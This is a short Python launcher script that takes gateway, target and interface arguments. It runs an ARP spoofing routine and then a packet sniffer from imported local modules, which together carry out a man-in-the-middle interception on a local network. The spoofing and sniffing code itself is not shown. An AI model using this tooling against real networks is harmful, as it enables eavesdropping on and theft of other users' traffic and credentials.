#/usr/bin/env python

import optparse 
import lib.arp_spoof as arp_spoof
import lib.packet_sniffer as packet_sniffer

# sys.path.append(os.path.abspath('../arpSpoof'))
# import arp_spoof

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-g", "--gateway", dest = "gateway", help = "IP gateway")
    parser.add_option("-t", "--target", dest = "target", help = "IP target")
    parser.add_option("-i", "--interface", dest = "interface", help = "Listening interface")
    (options, arguments) = parser.parse_args()

    return options

def main():
    options = get_arguments()

    target = options.target
    gateway = options.gateway
    interface = options.interface
    arp_spoof.run(target, gateway)
    
    packet_sniffer.sniff(interface)        

main()